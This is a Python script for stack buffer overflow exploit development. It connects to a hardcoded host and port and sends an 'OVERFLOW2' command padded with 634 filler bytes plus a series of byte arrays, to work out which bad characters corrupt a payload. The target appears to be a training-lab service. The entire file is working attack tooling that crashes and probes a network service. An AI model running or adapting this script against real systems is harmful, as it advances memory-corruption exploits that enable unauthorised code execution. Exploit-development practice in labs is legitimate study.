#!/usr/bin/env python3

import socket
import sys

def prompt_continue(message):
    print(f"\n{message}")
    print("Press [Enter] to continue or [q] then [Enter] to quit.")
    response = input("> ").strip().lower()
    if response == "q":
        print("User cancelled.")
        sys.exit(0)

def parse_badchars(badchars_str):
    badchars_str = badchars_str.lower().replace("\\x", "")
    if len(badchars_str) % 2 != 0:
        print(f"[!] Invalid badchar string length: '{badchars_str}'")
        print("[!] Ensure all bytes are formatted like \\x01\\x02.")
        sys.exit(1)
    try:
        return [int(badchars_str[i:i+2], 16) for i in range(0, len(badchars_str), 2)]
    except ValueError as e:
        print(f"[!] Error parsing badchars: {e}")
        sys.exit(1)

def build_payload(exclude=[]):
    return bytes([i for i in range(256) if i not in exclude])

def send_payload(payload, ip, port, prefix, overflow, retn, padding, postfix):
    buffer = prefix.encode() + overflow.encode() + retn.encode() + padding.encode() + payload + postfix.encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.send(buffer + b"\r\n")
        print("Payload sent.")
    except Exception as e:
        print("Could not connect or send payload:", str(e))
    finally:
        s.close()

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} badchars.txt")
        sys.exit(1)

    badchar_file = sys.argv[1]
    try:
        with open(badchar_file, "r") as f:
            raw_badchars = f.read().strip()
    except FileNotFoundError:
        print(f"[!] File not found: {badchar_file}")
        sys.exit(1)

    badchars = parse_badchars(raw_badchars)
    original_set = set(badchars)
    seen_sets = set()

    # --- Target Config (EDIT THESE) ---
    ip = "10.10.42.92"
    port = 1337
    prefix = "OVERFLOW2 "
    offset = 634
    overflow = "A" * offset
    retn = ""
    padding = ""
    postfix = ""
    # ----------------------------------

    print("Starting bad character verification...\n")

    current_exclude = set(badchars)
    payload = build_payload(exclude=current_exclude)
    frozen = frozenset(current_exclude)

    if frozen not in seen_sets:
        seen_sets.add(frozen)
        send_payload(payload, ip, port, prefix, overflow, retn, padding, postfix)
        prompt_continue("Initial payload sent (all badchars excluded).")

    for remove_byte in original_set:
        new_exclude = current_exclude.copy()
        new_exclude.remove(remove_byte)

        frozen = frozenset(new_exclude)
        if frozen in seen_sets:
            continue
        seen_sets.add(frozen)

        payload = build_payload(exclude=new_exclude)
        send_payload(payload, ip, port, prefix, overflow, retn, padding, postfix)
        prompt_continue(f"Payload sent with \\x{remove_byte:02x} removed.")

if __name__ == "__main__":
    main()
